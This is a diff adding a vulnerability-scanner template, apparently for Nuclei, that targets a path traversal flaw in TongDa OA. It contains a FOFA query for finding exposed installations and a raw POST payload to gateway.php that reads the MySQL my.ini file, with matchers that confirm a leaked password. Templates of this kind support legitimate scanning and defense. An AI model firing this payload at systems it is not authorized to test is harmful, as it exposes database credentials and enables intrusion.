@@ -1,0 +1,36 @@
+id: tongda-oa-path-traversal
+
+info:
+  name: TongDa OA Path Traversal
+  author: zp857
+  severity: critical
+  tags: tongda-oa,lfi
+  metadata:
+    fofa-query: 'body="Anywhere 2017版" || body="/static/templates/2017_01/" || body="请联系OA软件开发商" || body="tongda" || body="通达"'
+
+
+requests:
+  - raw:
+      - |
+        POST /ispirit/interface/gateway.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        json={"url":"/general/../../mysql5/my.ini"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "text/html"
+        part: header
+        condition: and
+      - type: word
+        words:
+          - "[mysql]"
+          - "password="
+        part: body
+        condition: and
+      - type: status
+        status:
+          - 200
